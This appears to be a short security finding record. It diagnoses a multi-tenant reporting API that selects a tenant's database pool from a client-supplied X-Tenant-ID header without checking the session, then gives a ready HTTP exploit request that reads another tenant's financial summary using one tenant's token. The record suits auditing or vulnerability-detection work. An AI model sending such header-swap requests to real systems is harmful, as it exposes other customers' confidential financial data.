diagnosis: The financial summary report route selects a dedicated tenant PostgreSQL connection pool from tenantPools solely based on the client-supplied X-Tenant-ID header. It performs no check to ensure the authenticated session belongs to that tenantId, allowing any user to execute queries against other tenants' isolated databases.
exploit_request:
GET /api/reports/financial-summary HTTP/1.1
Host: reporting.saas.internal:9101
Authorization: Bearer <tenant_alpha_user_token>
X-Tenant-ID: tenant_beta_enterprise
Accept: application/json
